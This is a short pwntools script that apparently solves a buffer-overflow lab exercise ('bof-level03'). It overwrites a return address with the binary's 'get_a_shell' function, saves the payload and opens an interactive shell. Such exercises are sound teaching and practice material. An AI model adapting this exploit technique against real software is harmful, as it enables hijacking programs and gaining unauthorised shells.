#!/usr/bin/env python

from pwn import *

e = ELF('./bof-level03')
get_a_shell = e.symbols['get_a_shell']

p = process('./bof-level03')

buf = p64(get_a_shell) * (32//8) + b"?@ABCDEFbcdefghi" + b"abcdefgh" + p64(get_a_shell)
with open("./payload", "wb") as f:
    f.write(buf)

p.sendline(buf)

p.interactive()
